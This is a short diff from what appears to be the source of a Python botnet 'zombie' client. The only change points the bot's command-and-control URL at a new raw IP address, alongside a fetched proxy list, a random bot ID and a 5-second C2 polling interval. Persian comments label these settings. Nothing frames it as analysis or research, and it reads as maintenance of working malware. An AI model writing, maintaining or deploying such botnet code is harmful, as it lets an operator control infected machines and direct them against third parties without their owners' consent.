@@ -16,7 +16,7 @@ logging.basicConfig(
 logger = logging.getLogger("ZOMBIE")
 
 # ========== CONFIG ==========
-C2_URL = "http://46.101.241.66:8083"  # آدرس C2
+C2_URL = "http://160.236.239.137:8083"  # آدرس C2
 PROXY_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt" # لینک پروکسی
 ZOMBIE_ID = str(uuid.uuid4())[:8]
 CHECK_INTERVAL = 5 # هر ۵ ثانیه به C2 سر میزنه
